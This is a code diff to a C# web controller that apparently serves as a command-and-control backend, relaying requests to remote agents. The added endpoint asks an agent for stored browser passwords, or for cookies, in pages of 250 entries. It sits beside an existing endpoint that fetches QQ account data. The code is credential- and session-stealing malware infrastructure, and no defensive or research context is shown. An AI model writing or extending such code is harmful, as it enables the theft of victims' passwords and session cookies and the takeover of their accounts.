@@ -20,7 +20,7 @@ public class OtherSoftController : ControllerBase
         _wsManager = wsManager;
     }
 
-    private async Task<IActionResult> RelayAndWaitAsync(string agentId, string messageType, object? data, CancellationToken ct)
+    private async Task<IActionResult> RelayAndWaitAsync(string agentId, string messageType, object? data, CancellationToken ct, int timeoutSeconds = 30)
     {
         var requestId = Guid.NewGuid().ToString("N");
 
@@ -37,7 +37,7 @@ public class OtherSoftController : ControllerBase
 
         try
         {
-            var response = await tcs.Task.WaitAsync(TimeSpan.FromSeconds(30), ct);
+            var response = await tcs.Task.WaitAsync(TimeSpan.FromSeconds(timeoutSeconds), ct);
             return response.Data != null
                 ? Content(response.Data.Value.GetRawText(), "application/json")
                 : Ok(new { status = "ok" });
@@ -58,6 +58,16 @@ public class OtherSoftController : ControllerBase
     public async Task<IActionResult> GetQQ(string agentId, CancellationToken ct)
     {
         return await RelayAndWaitAsync(agentId, "othersoft.qq", null, ct);
+    }
+
+    [HttpPost("{agentId}/browser")]
+    public async Task<IActionResult> GetBrowser(string agentId, [FromBody] JsonElement body, CancellationToken ct)
+    {
+        var type = body.TryGetProperty("type", out var t) ? t.GetString() ?? "passwords" : "passwords";
+        var offset = body.TryGetProperty("offset", out var o) ? o.GetInt32() : 0;
+        var limit = body.TryGetProperty("limit", out var l) ? l.GetInt32() : 250;
+        var timeout = type == "cookies" ? 60 : 30;
+        return await RelayAndWaitAsync(agentId, "othersoft.browser", new { type, offset, limit }, ct, timeout);
     }
 
     /// <summary>Fetch QQ portraits from qzone (server-side, no CORS).</summary>
